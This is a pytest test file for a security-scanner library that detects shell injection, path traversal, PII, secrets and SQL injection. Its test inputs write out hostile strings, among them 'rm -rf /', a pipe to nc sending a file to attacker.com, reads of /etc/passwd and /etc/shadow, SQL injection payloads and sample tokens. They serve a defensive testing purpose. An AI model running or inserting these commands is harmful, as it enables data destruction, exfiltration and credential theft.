"""Tests for security scanners."""

import pytest
from aegis.scanners import (
    extract_strings,
    ShellInjectionScanner,
    PathTraversalScanner,
    PIIDetector,
    SecretScanner,
    SQLInjectionScanner
)


class TestExtractStrings:
    """Test string extraction from nested structures."""

    def test_extract_simple_strings(self):
        obj = {"key": "value", "number": 42}
        strings = extract_strings(obj)
        assert "key" in strings
        assert "value" in strings
        assert "42" in strings

    def test_extract_nested_dict(self):
        obj = {"level1": {"level2": {"level3": "deep"}}}
        strings = extract_strings(obj)
        assert "deep" in strings

    def test_extract_list(self):
        obj = {"items": ["a", "b", "c"]}
        strings = extract_strings(obj)
        assert "a" in strings
        assert "b" in strings
        assert "c" in strings

    def test_max_depth(self):
        # Very deep nesting shouldn't crash
        obj = {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": "deep"}}}}}}}}}}
        strings = extract_strings(obj, max_depth=5)
        assert isinstance(strings, list)


class TestShellInjectionScanner:
    """Test shell injection detection."""

    def test_detects_semicolon_injection(self):
        scanner = ShellInjectionScanner()
        result = scanner.scan(["ls; rm -rf /"])
        assert result['detected'] is True
        assert result['severity'] in ['medium', 'high']

    def test_detects_pipe_injection(self):
        scanner = ShellInjectionScanner()
        result = scanner.scan(["cat file | nc attacker.com 9999"])
        assert result['detected'] is True

    def test_detects_command_substitution(self):
        scanner = ShellInjectionScanner()
        result = scanner.scan(["echo $(whoami)"])
        assert result['detected'] is True
        assert result['severity'] == 'high'

    def test_detects_backtick_substitution(self):
        scanner = ShellInjectionScanner()
        result = scanner.scan(["echo `id`"])
        assert result['detected'] is True

    def test_safe_strings(self):
        scanner = ShellInjectionScanner()
        result = scanner.scan(["hello world", "test.txt", "123"])
        assert result['detected'] is False
        assert result['severity'] == 'none'


class TestPathTraversalScanner:
    """Test path traversal detection."""

    def test_detects_dotdot_slash(self):
        scanner = PathTraversalScanner()
        result = scanner.scan(["../../../etc/passwd"])
        assert result['detected'] is True
        assert result['severity'] == 'high'

    def test_detects_sensitive_paths(self):
        scanner = PathTraversalScanner()
        result = scanner.scan(["/etc/shadow"])
        assert result['detected'] is True

    def test_detects_url_encoded(self):
        scanner = PathTraversalScanner()
        result = scanner.scan(["%2e%2e%2f"])
        assert result['detected'] is True

    def test_absolute_path_blocking(self):
        scanner = PathTraversalScanner(allow_absolute=False)
        result = scanner.scan(["/etc/hosts"])
        assert result['detected'] is True

    def test_safe_relative_paths(self):
        scanner = PathTraversalScanner(allow_absolute=False)
        result = scanner.scan(["file.txt", "subdir/file.txt"])
        # These are safe relative paths
        assert result['detected'] is False


class TestPIIDetector:
    """Test PII detection."""

    def test_detects_ssn(self):
        detector = PIIDetector()
        result = detector.scan(["My SSN is 123-45-6789"])
        assert result['detected'] is True
        assert result['severity'] in ['medium', 'high']

    def test_detects_credit_card(self):
        detector = PIIDetector()
        # Valid Visa test card
        result = detector.scan(["Card: 4532-0151-1283-0366"])
        assert result['detected'] is True

    def test_detects_email(self):
        detector = PIIDetector()
        result = detector.scan(["Contact: user@example.com"])
        assert result['detected'] is True

    def test_detects_phone(self):
        detector = PIIDetector()
        result = detector.scan(["Call me at (555) 123-4567"])
        assert result['detected'] is True

    def test_safe_text(self):
        detector = PIIDetector()
        result = detector.scan(["This is normal text without PII"])
        assert result['detected'] is False


class TestSecretScanner:
    """Test secret detection."""

    def test_detects_aws_key(self):
        scanner = SecretScanner()
        result = scanner.scan(["AWS_KEY=AKIAIOSFODNN7EXAMPLE"])
        assert result['detected'] is True
        assert result['severity'] == 'high'

    def test_detects_github_token(self):
        scanner = SecretScanner()
        result = scanner.scan(["ghp_1234567890abcdefghijklmnopqrstuv"])
        assert result['detected'] is True

    def test_detects_jwt(self):
        scanner = SecretScanner()
        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        result = scanner.scan([jwt])
        assert result['detected'] is True

    def test_detects_private_key(self):
        scanner = SecretScanner()
        result = scanner.scan(["-----BEGIN RSA PRIVATE KEY-----"])
        assert result['detected'] is True

    def test_safe_text(self):
        scanner = SecretScanner()
        result = scanner.scan(["This is normal text"])
        assert result['detected'] is False


class TestSQLInjectionScanner:
    """Test SQL injection detection."""

    def test_detects_union_select(self):
        scanner = SQLInjectionScanner()
        result = scanner.scan(["' UNION SELECT * FROM users--"])
        assert result['detected'] is True
        assert result['severity'] == 'high'

    def test_detects_or_1_equals_1(self):
        scanner = SQLInjectionScanner()
        result = scanner.scan(["' OR 1=1--"])
        assert result['detected'] is True

    def test_detects_comment_injection(self):
        scanner = SQLInjectionScanner()
        result = scanner.scan(["username'; DROP TABLE users;--"])
        assert result['detected'] is True

    def test_detects_multiple_keywords(self):
        scanner = SQLInjectionScanner()
        result = scanner.scan(["SELECT password FROM users WHERE id=1"])
        assert result['detected'] is True

    def test_safe_text(self):
        scanner = SQLInjectionScanner()
        result = scanner.scan(["This is normal text"])
        assert result['detected'] is False
